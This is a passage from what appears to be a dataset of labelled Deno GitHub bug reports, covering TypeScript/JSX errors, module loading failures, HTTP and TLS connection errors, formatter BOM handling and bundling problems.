❌\r\n```bash\r\n❯ deno run --allow-net app.tsx\r\nCompile file:///Users/overglass/lab/deno/app.tsx\r\nerror: TS7026 [ERROR]: JSX element implicitly has type 'any' because no interface 'JSX.IntrinsicElements' exists.\r\nconst component = <h1>Deno</h1>;\r\n                  ~~~~\r\n    at file:///Users/overglass/lab/deno/app.tsx:2:19\r\n\r\nTS7026 [ERROR]: JSX element implicitly has type 'any' because no interface 'JSX.IntrinsicElements' exists.\r\nconst component = <h1>Deno</h1>;\r\n                          ~~~~~\r\n    at file:///Users/overglass/lab/deno/app.tsx:2:27\r\n\r\nFound 2 errors.\r\n```\r\n[output] [2] 🦕\r\n```bash\r\n❯ deno run --allow-net app.tsx\r\nCompile file:///Users/overglass/lab/deno/app.tsx\r\nIt Works !\r\n```\r\n`deno version 1.0.3`\r\nI have the same issue with pika.dev CDN\r\n\r\nThank you for your work :)"},{"labels":["bug",null],"text":"Every time i try to load modules like bcrypt, mongo and etc. code crashes and shows me this error.\r\n\r\n`error: The system cannot find the path specified. (os error 3)`.\r\n\r\n```\r\nimport { Application, Router } from \"https://deno.land/x/oak/mod.ts\";\r\nimport { init, mongoClient } from \"https://deno.land/x/mongo/mod.ts\";\r\n```\r\nhere first line is executed correctly, but the second line throws an error."},{"labels":["bug",null],"text":"```typescript\r\n\r\nimport { serve, ServerRequest } from 'https://deno.land/std@02d46bae9f60e8114af2a107c05d717be3a7e70d/http/server.ts';\r\n\r\nasync function respond(req: ServerRequest) {\r\n  for (let i = 0; i < 1000000; ++i) {} // can't reproduce without some computing load\r\n  try {\r\n    await req.respond({});\r\n  } catch {}\r\n}\r\n\r\nfor await (const req of serve({ port: 8080 })) {\r\n  respond(req);\r\n}\r\n\r\n```\r\n\r\n\r\nI start the server\r\n```\r\nC:\\workspace\\deno>deno run --allow-net=0.0.0.0:8080 test.ts\r\n```\r\n\r\nand shortly after running autocannon (npm benchmark client)\r\n\r\n```\r\nC:\\workspace>autocannon http://localhost:8080 -b \"               \" -m POST -d 1 -c 100 -p 100 -f\r\n```\r\n\r\nI get the exception below\r\n\r\n```\r\nerror: Uncaught ConnectionAborted: An established connection was aborted by the software in your host machine. (os error 10053)\r\n    at unwrapResponse ($deno$/ops/dispatch_minimal.ts:63:11)\r\n    at Object.sendAsyncMinimal ($deno$/ops/dispatch_minimal.ts:106:10)\r\n    at async Object.read ($deno$/ops/io.ts:39:17)\r\n    at async BufReader.read (https://deno.land/std@02d46bae9f60e8114af2a107c05d717be3a7e70d/io/bufio.ts:145:12)\r\n    at async Object.read (https://deno.land/std@02d46bae9f60e8114af2a107c05d717be3a7e70d/http/_io.ts:27:16)\r\n    at async ServerRequest.finalize (https://deno.land/std@02d46bae9f60e8114af2a107c05d717be3a7e70d/http/server.ts:111:13)\r\n    at async Server.iterateHttpRequests (https://deno.land/std@02d46bae9f60e8114af2a107c05d717be3a7e70d/http/server.ts:179:7)\r\n    at async Server.acceptConnAndIterateHttpRequests (https://deno.land/std@02d46bae9f60e8114af2a107c05d717be3a7e70d/http/server.ts:223:5)\r\n    at async MuxAsyncIterator.callIteratorNext (https://deno.land/std@02d46bae9f60e8114af2a107c05d717be3a7e70d/async/mux_async_iterator.ts:28:29)\r\n\r\n```\r\n\r\nStrangely, I only get the exception if i use a body of size 15, 23, 26, 29, 36, ...\r\nI tried all the sizes up til then, with bodies of another size I don't get an error and I don't see a pattern\r\n\r\nAn other error I get is when I ctrl+c autocannon during testing\r\n\r\n```\r\nerror: Uncaught TypeError: invalid argument\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)\r\n    at async ListenerImpl.accept ($deno$/net.ts:61:17)\r\n    at async Server.acceptConnAndIterateHttpRequests (https://deno.land/std@02d46bae9f60e8114af2a107c05d717be3a7e70d/http/server.ts:212:14)\r\n    at async MuxAsyncIterator.callIteratorNext (https://deno.land/std@02d46bae9f60e8114af2a107c05d717be3a7e70d/async/mux_async_iterator.ts:28:29)\r\n\r\n```\r\n\r\nThis one is, I'd say, indepenent of the body size\r\n\r\n\r\n\r\n\r\n"},{"labels":["bug",null],"text":"## Reproduce code\r\n\r\n```js\r\nimport {\r\n  listenAndServe,\r\n} from \"https://deno.land/std/http/server.ts\";\r\n\r\nconst body = \"Hello World\\n\";\r\nconst options = { port: 3000 };\r\nlistenAndServe(options, (req) => {\r\n  for (let i = 0; i < 100; i++) {\r\n    req.respond({ body });\r\n  }\r\n});\r\n```\r\n\r\n## Error\r\n\r\n```\r\nerror: Uncaught BrokenPipe: Broken pipe (os error 32)   \r\n    at unwrapResponse ($deno$/ops/dispatch_minimal.ts:63:11)\r\n    at Object.sendAsyncMinimal ($deno$/ops/dispatch_minimal.ts:106:10)\r\n    at async Object.write ($deno$/ops/io.ts:65:18)\r\n    at async BufWriter.flush (https://deno.land/std/io/bufio.ts:475:25)\r\n    at async writeResponse (https://deno.land/std/http/_io.ts:274:3)\r\n    at async ServerRequest.respond (https://deno.land/std/http/server.ts:97:7)\r\n```\r\n\r\n## Analysis\r\n\r\nThe underneath HTTP connection has been closed when trying to write data into it.\r\n\r\n## Suggestion\r\n\r\nNode.js uses a `finished` tag to indicates whether the response has responded or not. https://github.com/nodejs/node/blob/master/lib/_http_outgoing.js#L817\r\n\r\nMaybe Deno can do those similar things.\r\n\r\n\r\n"},{"labels":["bug",null,null],"text":"Hi! This is my first time looking at Deno, and it seems to be very exciting :)\r\n\r\nI was playing around with the examples from the tutorial and noticed this inconsistency: (using powershell and windows terminal):\r\n\r\n```\r\n> deno run https://deno.land/std/examples/welcome.ts\r\nWelcome to Deno 🦕\r\n> deno run --allow-net https://deno.land/std/examples/curl.ts https://deno.land/std/examples/welcome.ts\r\nconsole.log(\"Welcome to Deno ­ƒªò\");\r\n```\r\n\r\nI found that editing `curl.ts` to add the line \r\n```ts\r\nimport { decode } from \"https://deno.land/std/encoding/utf8.ts\";\r\n```\r\nand replacing the `Deno.stdout.write` line with\r\n```ts\r\nconsole.log(decode(body));\r\n```\r\nseems to make the downloaded file print out correctly."},{"labels":["bug",null,null],"text":"Hi,\r\n\r\nI tried to write an app with Deno and noticed that `addEventListener` doesn't return `detail` property on a `CustomEvent`.\r\nIt should return `detail` property.\r\n\r\nUPD: my bad, it actually returns `detail` property, but it doesn't exist on type `EventListener`.\r\n\r\n"},{"labels":["bug",null],"text":"`ec2-52-54-1-79.compute-1.amazonaws.com:5432` is a PostgreSQL server with a self-signed SSL certificate (Heroku Postgres):\r\n\r\n```\r\n$ openssl s_client -starttls postgres -connect ec2-52-54-1-79.compute-1.amazonaws.com:5432 -verifyCAfile /tmp/cert -verify_hostname ip-10-0-81-231.ec2.internal </dev/null\r\nCONNECTED(00000004)\r\ndepth=0 CN = ip-10-0-81-231.ec2.internal\r\nverify return:1\r\n---\r\nCertificate chain\r\n 0 s:CN = ip-10-0-81-231.ec2.internal\r\n   i:CN = ip-10-0-81-231.ec2.internal\r\n---\r\nServer certificate\r\n-----BEGIN CERTIFICATE-----\r\nMIIC3DCCAcSgAwIBAgIJAPvPvOOARSuaMA0GCSqGSIb3DQEBCwUAMCYxJDAiBgNV\r\nBAMMG2lwLTEwLTAtODEtMjMxLmVjMi5pbnRlcm5hbDAeFw0yMDAzMDIxMDEzMTNa\r\nFw0zMDAyMjgxMDEzMTNaMCYxJDAiBgNVBAMMG2lwLTEwLTAtODEtMjMxLmVjMi5p\r\nbnRlcm5hbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOHR949mb6Te\r\n0/tr2057YWURGs85/6BRvBu+eC7mu/Ou0w9Z4xYMz8GCIbaqw+tHqM5LL7oc+jgm\r\n3VbgZVk1JHoiDi+Bb4zOzHqAXn8GPZlX03pNVtXeOvzKUO+MGZ5ePimOf+ljgGkb\r\n/N4FjYYW3v+tXVk1i2v02/jo5vjEPUaMLApTEDlfoWJyIyUvlc46Qecb5iQ5QzxZ\r\nm4XEgAG52aTNT8Vvs906mW7sCqJ6TYQGyMUs5NvEbeG/+naGTa0VDWtfogDfeXWY\r\nyN/sLY0YpE+lGjVSAizZAnv7/JgBCpMwTOVXiaZigoxByAiC2KzqkW/IIZIdhTOJ\r\n1B/PqNJrkvcCAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsFAAOCAQEA\r\nBmS5whv6ImetznFEszGGm47lN69J0Bme91nKaMSRWYf4oF6DywHT9onCASdo9VKI\r\n3Wfh3XGUu0W1RRHvLSn8hrpBe5qZnNj5iIkUSWWNjX5bg5/R1C8PaUXofx0CaPVw\r\nNEgoWADy06+sotHDutEPaOsjFhSrIg3zX8LpsoOJmxwkGbiCAlNyEcQoJgpiUTte\r\nQvWubGR6/M3Djl9Dgmnd1sHOEkaT1YUA0Cq8VpFNpQV6eEBpxn38aeeKtx7zblwr\r\nUlN0CHc70vkD5hoyCTD7C5Tq+zY2fk4r9eWaHFcRWYSRPY6y6J9vEnkPwj7biQQD\r\n1YZo1a+aKNkgwYfwETJ9fA==\r\n-----END CERTIFICATE-----\r\nsubject=CN = ip-10-0-81-231.ec2.internal\r\n\r\nissuer=CN = ip-10-0-81-231.ec2.internal\r\n\r\n---\r\nNo client certificate CA names sent\r\nPeer signing digest: SHA512\r\nPeer signature type: RSA\r\nServer Temp Key: ECDH, P-256, 256 bits\r\n---\r\nSSL handshake has read 1212 bytes and written 464 bytes\r\nVerification: OK\r\nVerified peername: ip-10-0-81-231.ec2.internal\r\n---\r\nNew, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384\r\nServer public key is 2048 bit\r\nSecure Renegotiation IS supported\r\nCompression: NONE\r\nExpansion: NONE\r\nNo ALPN negotiated\r\nSSL-Session:\r\n    Protocol  : TLSv1.2\r\n    Cipher    : ECDHE-RSA-AES256-GCM-SHA384\r\n    Session-ID: \r\n    Session-ID-ctx: \r\n    Master-Key: 2540E33B75927E0AA4D9C9540B6F9A4FA965E604732675A5E3625631883EC323539B8200F2CCC9F5126938BEAB888517\r\n    PSK identity: None\r\n    PSK identity hint: None\r\n    SRP username: None\r\n    Start Time: 1590879435\r\n    Timeout   : 7200 (sec)\r\n    Verify return code: 0 (ok)\r\n    Extended master secret: no\r\n---\r\nDONE\r\n```\r\n\r\nI have saved the server cert reported above into `/tmp/cert`.\r\n\r\nThe following code fails:\r\n\r\n```ts\r\nimport { connectPg } from './src/mod.ts'\r\nimport { assertEquals } from 'https://deno.land/std/testing/asserts.ts'\r\n\r\nconst conn = await Deno.connect({\r\n    hostname: 'ec2-52-54-1-79.compute-1.amazonaws.com',\r\n    port: 5432,\r\n})\r\n\r\n// Write magic number\r\nconst magic = new Uint8Array(8);\r\n(new DataView(magic.buffer)).setInt32(0, 8);\r\n(new DataView(magic.buffer)).setInt32(4, 80877103);\r\nassertEquals(await conn.write(magic), 8);\r\n\r\n// Server should reply with 'S'\r\nconst reply = new Uint8Array(1)\r\nassertEquals(await conn.read(reply), 1)\r\nassertEquals(String.fromCharCode(reply[0]), 'S')\r\n\r\nconst tlsConn = await Deno.startTls(conn, {\r\n    hostname: 'ip-10-0-81-231.ec2.internal',\r\n    certFile: '/tmp/cert',\r\n})\r\n\r\nconsole.log('connected')\r\n```\r\n\r\nresult:\r\n\r\n```\r\n% deno run -A --unstable test.ts\r\nCompile file:///Users/jaka/Development/pgc4d/test.ts\r\nWARN RS - rustls::session:718 - Sending fatal alert BadCertificate\r\nerror: Uncaught InvalidData: invalid certificate: CertNotValidForName\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)\r\n    at async Object.startTls ($deno$/tls.ts:70:15)\r\n    at async file:///Users/jaka/Development/pgc4d/test.ts:24:17\r\n```\r\n\r\nI believe this should work. As you can see, the `openssl s_client` says:\r\n```\r\nVerification: OK\r\nVerified peername: ip-10-0-81-231.ec2.internal\r\n```"},{"labels":["bug",null],"text":"When I try to run deno.land server example code:\r\n\r\n`import { serve } from \"https://deno.land/std@0.54.0/http/server.ts\";\r\nconst s = serve({ port: 8000 });\r\nconsole.log(\"http://localhost:8000/\");\r\nfor await (const req of s) {\r\n  req.respond({ body: \"Hello World\\n\" });\r\n}`\r\n\r\nbut as JavaScript file (deno run --allow-net server.js) I get error:\r\n\r\n[Error 3] The system cannot find the path specified\r\n\r\nOnly when I run it as .ts and then again as .js it work.\r\n\r\n"},{"labels":["bug",null],"text":"Hi, the following script:\r\n\r\n```\r\nimport('https://unpkg.com/rollup@2.10.9/dist/es/rollup.browser.js')\r\n```\r\n\r\nfails in deno v1.0.3, but not in any prior version, with the following error:\r\n\r\n```\r\nerror: Uncaught TypeError: TS1031 at https://unpkg.com/rollup@2.10.9/dist/es/rollup.browser.js:11:158446,Unexpected token Some(LParen) at https://unpkg.com/rollup@2.10.9/dist/es/rollup.browser.js:11:158453\r\n```\r\n\r\nIs this a bug that should be filed with swc?"},{"labels":["bug",null],"text":"I know plugins are currently unstable so this might be something that is in the works, but I thought I'd report it anyways.\r\n\r\nIt seems calling `Deno.close()` on a previously opened Deno plugin (with `Deno.openPlugin()`) does not actually do anything. The ops registered by the plugin are still available in `Deno.core.ops()` and they are still callable.\r\n\r\nI've written a quick test script to reproduce the issue but you need your own plugin\r\n```ts\r\nimport { resolve } from \"https://deno.land/std@v0.53.0/path/mod.ts\";\r\nimport { assert } from \"https://deno.land/std@v0.53.0/testing/asserts.ts\";\r\n\r\n// Pass in the path to a plugin here\r\nconst pluginPath = Deno.args[0] || './target/debug/libdeno_notify.dylib';\r\nconst filename = resolve(pluginPath);\r\nconsole.log(\"Opening plugin:\", filename);\r\n\r\nconst pluginId = Deno.openPlugin(filename);\r\n\r\n// This passes\r\nassert((Deno as any).core.ops()['notify_send'], \"Notify ops do not exist while they should be available.\");\r\n\r\nDeno.close(pluginId);\r\n\r\n// This fails\r\nassert(!(Deno as any).core.ops()['notify_send'], \"Notify ops still exist while they should be removed.\");\r\n```\r\nNote: I ran this with `deno 1.0.3`, `v8 8.4.300`, `typescript 3.9.2`"},{"labels":["bug"],"text":"**To reproduce:**\r\n\r\n```\r\n// file_server_test.ts\r\n\r\nimport { serve } from \"https://deno.land/std@0.53.0/http/server.ts\";\r\nimport { serveFile } from \"https://deno.land/std@0.53.0/http/file_server.ts\";\r\nimport { parse } from \"https://deno.land/std@0.53.0/flags/mod.ts\";\r\n\r\nconst args = parse(Deno.args);\r\nif (args.h) {\r\n  console.log('Usage: test');\r\n  Deno.exit();\r\n}\r\n\r\nfor await (const req of serve({ port: 8080 })) {\r\n  serveFile(req, 'foo');\r\n}\r\n```\r\n```\r\n$ deno run --allow-read file_server_test.ts -h\r\n```\r\n\r\n**Actual:** prints out \"Deno File Server\" usage, does not print out script's own usage\r\n```\r\n$ deno --version\r\ndeno 1.0.3\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n$ deno run --allow-read file_server_test.ts -h\r\n...\r\nDeno File Server\r\n  Serves a local directory in HTTP.\r\n...\r\n```\r\n\r\n**Expected:** when imported as a module, `file_server` should not make use of the program args, exit the process, or print anything to the console."},{"labels":["bug",null],"text":"`deno upgrade` relies on `/proc` for Linux systems. This leads to an error if `/proc` is not available (e.g. in a chroot environment).\r\n\r\n### Problematic code\r\nhttps://github.com/denoland/deno/blob/dad551a3a77346d190663003e366dd94ce46626d/cli/upgrade.rs#L101\r\n\r\n### Error\r\n```rust\r\nErr(Custom { kind: Other, error: \"no /proc/self/exe available. Is /proc mounted?\" })\r\n```\r\n\r\nSee also: https://github.com/rust-lang/cargo/issues/4450 and https://github.com/rust-lang/cargo/pull/4634"},{"labels":["bug"],"text":"After upgrading deno to v1.0.3, private field in a class cannot be recognized in bundled file.\r\n\r\nFollowing is reproducable typescript file as `test.ts`.\r\n\r\n```test.ts\r\nclass Foo {\r\n  #field:string = \"VALUE\";\r\n  setValue(val:string):void {\r\n    this.#field = val;\r\n  }\r\n  getValue(): string {\r\n    return this.#field;\r\n  }\r\n}\r\n\r\nconst bar = new Foo();\r\nbar.setValue(\"PRIVATE\")\r\nconsole.log(bar.getValue());\r\n```\r\n\r\nOn deno 1.0.3, `#` is recognized as `Unexpected token`.\r\n\r\n```\r\n$ deno bundle test.ts > test.js\r\nBundling file:///<PATH_TO_PROJECT>/test.ts\r\n$ deno run test.js\r\nerror: Unexpected token '#' at file:///<PATH_TO_PROJECT>/test.js:111:9\r\n```\r\n\r\nBut it works well on v1.0.2.\r\n\r\n```\r\n$ deno run test.js\r\nPRIVATE\r\n```\r\n\r\nCould you please look into it?\r\n\r\nRegards,"},{"labels":["bug",null],"text":"```\r\n> deno run --v8-flags=--help\r\nerror: The following required arguments were not provided:\r\n    <SCRIPT_ARG>...\r\n\r\nUSAGE:\r\n    deno run <SCRIPT_ARG>... --v8-flags=<v8-flags>\r\n\r\nFor more information try --help\r\n```\r\n\r\nThis works.\r\n```\r\ndeno run --v8-flags=--help _\r\n```\r\n\r\n\r\nIt's because it's missing the script. We need a better way of doing this.\r\n"},{"labels":["bug",null,null],"text":"It is currently impossible to know when the user presses a special key in Console Window Host (the default terminal, `conhost.exe`) or [Windows Terminal](https://github.com/microsoft/terminal).\r\n\r\nHere's a test script (needs `--unstable` because of `Deno.setRaw()`):\r\n\r\n```js\r\nconst stdinRid = Deno.stdin.rid;\r\nif (Deno.isatty(stdinRid))\r\n    Deno.setRaw(stdinRid, true);\r\n\r\n(async () => {\r\n    for await (const data of Deno.iter(Deno.stdin)) {\r\n        if (data[0] === 0x03) // Ctrl+C\r\n            Deno.exit();\r\n        console.log(data);\r\n    }\r\n})();\r\n```\r\n\r\nThis could log an escape sequence when the user presses, for example, the arrow keys (I think it does on Linux), but it logs nothing."},{"labels":["bug",null],"text":"This error occurs when launching Deno from Git Bash.\r\n\r\n```\r\nuser@computer MINGW64 /c/fakepath\r\n$ deno repl --unstable\r\nDeno 1.0.2\r\nexit using ctrl+d or close()\r\nDeno.isatty(Deno.stdin.rid)\r\ntrue\r\nDeno.setRaw(Deno.stdin.rid, true)\r\nUncaught Error: O identificador é inválido. (os error 6)\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendSync ($deno$/ops/dispatch_json.ts:72:10)\r\n    at Object.setRaw ($deno$/ops/tty.ts:8:3)\r\n    at <unknown>:1:6\r\n    at evaluate ($deno$/repl.ts:52:34)\r\n    at Object.replLoop ($deno$/repl.ts:149:13)\r\n```\r\n\r\n\"O identificador é inválido.\" is Portuguese for \"The identifier is invalid.\". This works fine in Node.js. Also, it's possible to move the cursor to anywhere on the Git Bash terminal using the arrow keys, something usually only possible if raw mode is enabled and `stdin` is being piped into `stdout`."},{"labels":["bug",null],"text":"It appears that the file_server does not close file resources it opens:\r\n\r\nhttps://github.com/denoland/deno/blob/02a67205276e122da07e51810df9d031ded80ce1/std/http/file_server.ts#L119-L135\r\n\r\nThe file server should track resources it opens and then close them after the `request.respond()` completes."},{"labels":["bug",null],"text":"```ts\r\n// mod.ts\r\nexport * from 'https://cdn.pika.dev/vtils@3.0.1-beta.2'\r\n```\r\n\r\n```ts\r\n// a.ts\r\nimport * as vtils from './mod.ts'\r\n\r\nconsole.log(Object.keys(vtils).includes('isNumber'))\r\n```\r\n\r\n`deno run -A -r a.ts`:\r\n\r\n![image](https://user-images.githubusercontent.com/13151189/83218638-e6f6e180-a1a0-11ea-942a-fa1f01f1f0f2.png)\r\n\r\n\r\n```ts\r\n// b.ts\r\nimport * as vtils from './mod.ts'\r\n\r\nconsole.log(vtils.isNumber)\r\n```\r\n\r\n`deno run -A -r b.ts`:\r\n\r\n![image](https://user-images.githubusercontent.com/13151189/83218678-fe35cf00-a1a0-11ea-95bb-72f343ba9020.png)\r\n\r\n```ts\r\n// c.ts\r\nimport * as vtils from 'https://cdn.pika.dev/vtils@3.0.1-beta.2'\r\n\r\nconsole.log(vtils.isNumber)\r\n```\r\n\r\n`deno run -A -r c.ts`:\r\n\r\n![image](https://user-images.githubusercontent.com/13151189/83218935-a186e400-a1a1-11ea-8136-6a0c95ad73ce.png)\r\n"},{"labels":["bug",null],"text":"```ts\r\n// working\r\nconst asyncFunc = async () => {\r\n    return someValue;\r\n}\r\nlet someValue = await asyncFunc();\r\n\r\n// prefered but not working\r\nlet someValue = await (async () => {\r\n   return someValue\r\n})();\r\n```\r\nsyntactically it is correct, but still it returns error ``Cannot find name 'await'.ts(2304)``"},{"labels":["bug",null],"text":"## Issue\r\n\r\nPassing a 2D array into console.table() appends an empty column titled \"Values\".\r\n\r\n### Code\r\n```ts\r\nlet arr =[[\"Apples\",\"Oranges\"],[\"Bananas\",\"Cherries\"]];\r\nconsole.table(arr);\r\n```\r\n\r\n### Expected Behavior\r\n\r\n| (index) | 0 | 1 |\r\n| ------------- | ------------- | ------------- |\r\n| 0  | Apples  | Oranges |\r\n| 1  | Bananas | Cherries |\r\n\r\n\r\n### Actual Behavior\r\n| (index) | 0 | 1 | Values |\r\n| ------------- | ------------- | ------------- | ------------- |\r\n| 0  | Apples  | Oranges |\r\n| 1  | Bananas | Cherries |\r\n\r\n![deno_console_table_issue_screenshot](https://user-images.githubusercontent.com/35490486/83050280-f32c5300-a069-11ea-9aa3-3accdb931cf4.png) \r\n\r\n### Specifications\r\n\r\n  - Version: 1.0.0\r\n  - Platform: Microsoft Windows"},{"labels":["bug",null],"text":"Minimal reproducible example is:\r\n```\r\n// in mod.tsx\r\nimport foo from \"./foo.js\";\r\n```\r\nRegardless of whether or not foo.js exists, this yields `error: TS2307 [ERROR]: Cannot find module './foo.js' or its corresponding type declarations.`\r\n\r\nBehaviour exists when trying to import either `.js` or `.jsx` from `.tsx` and not from any other permutation.\r\n\r\nIs this simply a bad error message covering up a case where it expects me to specify a type file?"},{"labels":["bug"],"text":"`deno 1.0.2\r\nv8 8.4.300\r\ntypescript 3.9.2`\r\n\r\nWhen deploying locally using the following command:\r\n\r\n`deno run --allow-net --allow-write --allow-read --unstable --allow-plugin server.ts`\r\n\r\nThere are no errors. Works.\r\n\r\nWhen deploying to Heroku with the following inside of the Procfile:\r\n\r\n`web: deno run --allow-net=:${PORT} --allow-write --allow-read --unstable --allow-plugin --cached-only server.ts --port=${PORT}`\r\n\r\nI get the following error:\r\n\r\n`error: TS2339 [ERROR]: Property 'openPlugin' does not exist on type 'typeof Deno'. remote: return Deno.openPlugin(localPath); at https://deno.land/x/plugin_prepare@v0.6.0/mod.ts:64:15`"},{"labels":["bug",null],"text":"Modules like [i18next-fs-backend](https://github.com/i18next/i18next-fs-backend) or [i18next-http-backend](https://github.com/i18next/i18next-http-backend) are written to work for Deno, Node.js and browser environments...\r\n\r\nAnd this works until Deno > v1.0.0...\r\n\r\nBut now stuff like this is not working anymore: https://github.com/i18next/i18next-fs-backend/issues/5\r\n\r\nhttps://github.com/i18next/i18next-fs-backend/blob/master/lib/readFile.js#L4\r\n`import * as fsMod from './fs.cjs'`\r\n\r\nAny advice?"},{"labels":["bug",null],"text":"I have the following source code:\r\n```tsx\r\nimport * as pkg from 'https://cdn.pika.dev/node-fetch/^2.6.0';\r\nconsole.log('PACKAGE:', pkg);\r\n```\r\n\r\nRunning on latest (1.0.2) yields:\r\n```\r\ndeno --version\r\ndeno 1.0.2\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n\r\ndeno run --reload <above_test>\r\nDownload https://cdn.pika.dev/node-fetch/^2.6.0\r\nDownload https://cdn.pika.dev/-/node-fetch@v2.6.0-AJHWZQobu33EvFJcmA2J/dist=es2019,mode=types/index.d.ts\r\nDownload https://cdn.pika.dev/-/node-fetch@v2.6.0-AJHWZQobu33EvFJcmA2J/dist=es2019/node-fetch.js\r\nDownload https://cdn.pika.dev/http/dist=es2019,mode=types/index.d.ts\r\nDownload https://cdn.pika.dev/url/dist=es2019,mode=types/index.d.ts\r\nDownload https://cdn.pika.dev/-/node-fetch@v2.6.0-AJHWZQobu33EvFJcmA2J/dist=es2019,mode=types/externals.d.ts\r\nDownload https://cdn.pika.dev/-/url@v0.11.0-4GEt8r64v6xtacsEmNHX/dist=es2019,mode=types/index.d.ts\r\nDownload https://cdn.pika.dev/-/http@v0.0.1-security/dist=es2019,mode=types/index.d.ts\r\nerror: Import 'https://cdn.pika.dev/-/url@v0.11.0-4GEt8r64v6xtacsEmNHX/dist=es2019,mode=types/index.d.ts' failed: 404 Not Found\r\n```\r\n\r\nFYI, the `http` and `url` packages do not exist on pika.dev.  It seems like the request tries to get type definitions for all sub-dependencies, but fails if they do not exist.\r\n\r\nPossibly related to: #5029 #5726 \r\n\r\n@bartlomieju \r\n\r\nAlso possibly relating to: https://github.com/pikapkg/cdn/issues/3 and https://github.com/pikapkg/cdn/issues/8"},{"labels":["bug"],"text":"I did a build from master and the following now errors (which it didn't previously):\r\n\r\n```ts\r\nconst foo = { delete<S>() {} };\r\n```\r\n\r\nI get:\r\n\r\n```shell\r\n$ deno run bad_parse.ts\r\nerror: TS1005 at file:///bad_parse.ts:1:20,Expected Comma, got Some(JSXTagStart) at file:///bad_parse.ts:1:20\r\n```\r\n\r\nBasically anything that contains a /method of `delete` and has some sort of generic blows up.  Likely related to `delete` being a reserved word in certain contexts, but being totally valid here.  TypeScript compiler has no problem with this.\r\n"},{"labels":["bug",null],"text":"I use MultipartReader to read multipart/form-data body. Thats ok, but when I use readForm function, It got a strange question.\r\nThe first request, it worked.\r\n\r\n![image](https://user-images.githubusercontent.com/46396510/82883826-8cc60880-9f75-11ea-84e4-de16eed13db5.png)\r\n\r\nBut the next request, it showed socket hang up error.\r\n\r\n![image](https://user-images.githubusercontent.com/46396510/82883901-a2d3c900-9f75-11ea-9e09-189f524ca52c.png)\r\n\r\nGo ahead, the next was ok, then the next was the same error. repeat again and again...\r\n\r\nhere is code. You can find these code in middleWare/requestBody/requestBody.ts\r\n[deno-demo.zip](https://github.com/denoland/deno/files/4681187/deno-demo.zip)\r\n\r\n"},{"labels":["bug",null],"text":"```\r\nerror: Uncaught UnexpectedEof: tls handshake eof\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)\r\n    at async TLSListenerImpl.accept ($deno$/tls.ts:31:17)\r\n    at async Server.acceptConnAndIterateHttpRequests (https://deno.land/std/http/server.ts:221:14)\r\n    at async MuxAsyncIterator.callIteratorNext (https://deno.land/std/async/mux_async_iterator.ts:28:29)\r\n```\r\noccurs randomly in varying scale; 4~ days ago happened non-stop, now rarely"},{"labels":["bug",null],"text":"- for browser compatibility and ensuring people don't have to change code to be deno specific\r\n\r\nTo recreate issue (linux):\r\ntype 'deno' in the terminal\r\n\r\ntype the following commands in the deno repl\r\n`const b = new Blob()`\r\n`b.constructor.name`\r\n\r\nyou should see the output\r\n`DenoBlob`\r\n\r\nthis is non standard, as the same command in the browser returns `Blob`,\r\n\r\nI found this error when I attempted to run jszip in deno"},{"labels":["bug",null],"text":"Input code (saved as UTF-8 w/ BOM):\r\n\r\n```ts\r\n/// <reference path='firebase.d.ts'/>\r\n\r\nexport declare class AngularFire {\r\n    asArray(): FirebaseArray;\r\n}\r\n\r\nexport interface FirebaseArray {\r\n    getItem(recOrIndex: any): any;\r\n    getChild(recOrIndex: any): any;\r\n    add(newData: any): void;\r\n    remove(recOrIndex: any): void;\r\n    save(recOrIndex: any): void;\r\n    keyify(snap: any): any;\r\n    created(snap: any): void;\r\n    moved(snap: any): void;\r\n    updated(snap: any): void;\r\n    removed(snap: any): void;\r\n    bulkUpdate(items: Object): void;\r\n    spliceOut(key: any): void;\r\n    indexFor(key: any): number;\r\n    getRecord(key: any): any;\r\n    list: any[];\r\n}\r\n```\r\n\r\nOutput code:\r\n\r\n```ts\r\n/// <reference path='firebase.d.ts'/>\r\n\r\nexport declare class AngularFire {\r\n  asArray(): FirebaseArray;\r\n}\r\n\r\nexport interface FirebaseArray {\r\n  getItem(recOrIndex: x: ): ): ;\r\n  getChild(recOrIndex: x: ): ): ;\r\n  add(newData: a: ): ): v;\r\n  remove(recOrIndex: x: ): ): v;\r\n  save(recOrIndex: x: ): ): v;\r\n  keyify(snap: p: ): ): ;\r\n  created(snap: p: ): ): v;\r\n  moved(snap: p: ): ): v;\r\n  updated(snap: p: ): ): v;\r\n  removed(snap: p: ): ): v;\r\n  bulkUpdate(items: Object): ): v;\r\n  spliceOut(key: y: ): ): v;\r\n  indexFor(key: y: ): ): num;\r\n  getRecord(key: y: ): ): ;\r\n  list: t: [];\r\n}\r\n```\r\n\r\nI'm thinking deno fmt should strip the BOM before providing the string to dprint then save the file with BOM afterwards."},{"labels":["bug",null],"text":"Steps to reproduce:\r\n\r\n1. Build a debug build on master\r\n2. Run this command a few times: `.\\target\\debug\\deno.exe run --reload test.ts`\r\n\r\ntest.ts\r\n```ts\r\nimport {\r\n  connectWebSocket,\r\n  isWebSocketCloseEvent,\r\n} from \"./std/ws/mod.ts\";\r\n```\r\n\r\nOutput\r\n```\r\nthread 'main' has overflowed its stack\r\n```\r\n\r\nI can't reproduce this issue before https://github.com/denoland/deno/commit/9d63772fe5bacc8fa1e0a8cbb152a2f107ae268f."},{"labels":["bug",null],"text":"Only if:\r\n* script execution is not paused\r\n* eager evaluation is on\r\n\r\n![image](https://user-images.githubusercontent.com/218257/82821970-51f49f80-9ea5-11ea-85bd-f976b98e4cc0.png)\r\n"},{"labels":["bug",null],"text":"When we bundle `https://deno.land/std/uuid/mod.ts` and run,  the following error occurs.\r\n\r\n```log\r\n➜  deno bundle https://deno.land/std/uuid/mod.ts uuid.bundle.js\r\n\r\n➜  deno run uuid.bundle.js                                     \r\nerror: Uncaught TypeError: Cannot read property '_TextDecoder' of undefined\r\n        